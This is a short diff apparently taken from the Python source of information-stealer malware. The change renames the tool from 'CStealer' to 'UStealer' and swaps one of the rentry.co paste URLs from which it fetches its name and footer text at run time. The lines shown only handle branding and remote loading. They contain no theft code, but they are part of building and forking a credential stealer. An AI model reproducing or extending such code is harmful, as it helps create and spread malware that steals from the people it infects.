@@ -172,13 +172,13 @@ def check_dll():
 
 cname = "https://rentry.co/u4tup/raw"
 cnameresp = requests.get(cname)
-cname = cnameresp.text
+cname = cnameresp.text.replace("CStealer","UStealer")
 
 smallcname = "https://rentry.co/u7hcdw7r/raw"
 smallcnameresp = requests.get(smallcname)
-smallcname = smallcnameresp.text
+smallcname = smallcnameresp.text.replace("c_stealer","u_stealer")
 
-footerc = "https://rentry.co/v7twqi9c/raw"
+footerc = "https://rentry.co/gp4xzf7g/raw"
 footercresp = requests.get(footerc)
 footerc = footercresp.text
 
